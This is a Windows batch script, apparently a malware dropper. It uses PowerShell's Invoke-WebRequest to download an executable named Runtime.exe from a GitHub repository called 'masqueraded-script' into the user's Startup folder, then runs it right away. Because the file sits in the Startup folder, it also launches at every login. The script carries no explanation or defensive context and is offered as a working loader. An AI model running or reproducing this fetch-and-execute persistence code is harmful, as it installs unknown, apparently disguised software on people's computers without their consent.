@echo off
setlocal


set "file_url=https://github.com/TaylorBrierley/masqueraded-script/raw/main/S2/Runtime.exe"

set "startup_folder=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "target_file=%startup_folder%\Runtime.exe"

powershell -Command "Invoke-WebRequest -Uri %file_url% -OutFile '%target_file%'"

if exist "%target_file%" (
    echo Download successful: %target_file%
    
    start "" "%target_file%"
) else (
    echo Download failed.
)

endlocal